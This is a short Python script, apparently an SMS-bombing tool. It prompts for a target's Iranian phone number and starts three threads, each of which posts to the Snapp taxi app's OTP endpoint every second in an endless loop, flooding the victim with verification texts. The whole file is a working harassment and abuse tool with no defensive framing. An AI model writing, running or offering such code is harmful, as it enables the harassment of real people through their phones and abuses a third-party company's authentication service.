import requests
import time as t
import threading as th

_phNumber = input("enter the target's phone number with out \"0\" or \"+98\"\nsample phone number: 9123456789: ")

def send_sms(iurl, ipayload):
    while True:
        r = requests.post(iurl, json=ipayload)
        t.sleep(1)
        if r.status_code == 200:
            print("SUCCEED")
        else:
            print("ERROR " + str(r.status_code))

# Snapp Threads
# init the Threads
ts0 = th.Thread(target=send_sms, args=('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber}))
ts1 = th.Thread(target=send_sms, args=('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber}))
ts2 = th.Thread(target=send_sms, args=('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber}))
# start the Threads
ts0.start()
ts1.start()
ts2.start()
# End of Snapp Threads
